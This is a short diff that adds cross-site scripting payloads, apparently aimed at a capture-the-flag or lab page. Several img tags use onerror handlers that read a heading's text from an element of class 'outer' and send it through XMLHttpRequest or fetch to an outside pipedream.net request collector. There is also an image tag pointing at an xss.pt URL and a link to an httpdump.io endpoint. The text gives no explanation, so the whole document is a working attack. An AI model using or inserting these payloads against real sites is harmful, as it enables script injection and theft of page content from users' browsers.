@@ -1,0 +1,11 @@
+<img src='
+
+' onerror="const oReq = new XMLHttpRequest();oReq.open('GET', 'http://enycahtwgtp2n.x.pipedream.net?msg='+document.getElementsByClassName('outer')[0].getElementsByTagName('h1')[0].innerText);oReq.send();">answer
+
+' ><Img sRC=https://xss.pt/u38np.jpg>
+
+https://httpdump.io/
+
+
+
+' onerror='fetch("https://enycahtwgtp2n.x.pipedream.net/"+document.getElementsByClassName("outer")[0].getElementsByTagName("h1")[0].innerText)'>answer
